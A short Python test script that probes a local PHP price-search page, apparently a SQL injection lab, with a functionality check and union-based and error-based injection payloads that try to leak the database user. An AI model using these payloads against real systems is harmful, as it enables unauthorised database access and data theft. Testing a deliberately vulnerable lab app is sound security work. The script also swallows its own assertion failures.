import pytest
import requests

##this is the testing funworkedctions for the search_by_price2.php file ##


########## Testing Functionality #############

def test_correct_functionality(base_url):
    max= 50
    url = base_url+"/search_by_price2.php?max=0"    
   
    response = requests.get(url)
    print(response.text)
    count= response.text.count("<br/>")
    try:
        assert response.status_code == 200 and count>0
        print(f"functionality worked and {count} item were found ")
    except AssertionError:        
        print ("Item was not found")
        

########## Union Based Injection Testing #############

def test_union_based_injection(base_url):
    max="50 UNION SELECT null, user() FROM users-- -"
    url= base_url+f"/search_by_price2.php?max="+max
    response= requests.get(url)
    print(response.text) 
    try: 
       assert response.status_code ==200 and "root@localhost" in response.text
       print("Union-Based test passed")
    except AssertionError:
       print("Union-Based injection failed")

########## Error Based Injection Testing #############

def test_error_based_injection(base_url):
    search="1 AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
    url= base_url+"/search_by_price2.php?max="+search
    response = requests.get(url)
    print(response.text)
    try:
        assert response.status_code == 200 and 'root@localhost' in response.text
        print("Error-Based injection passed")
    
    except AssertionError:
        print("Error-Based injection failed")
    

   


base_url= "http://localhost:4000/sqli"

test_correct_functionality(base_url)
test_union_based_injection(base_url)
test_error_based_injection(base_url)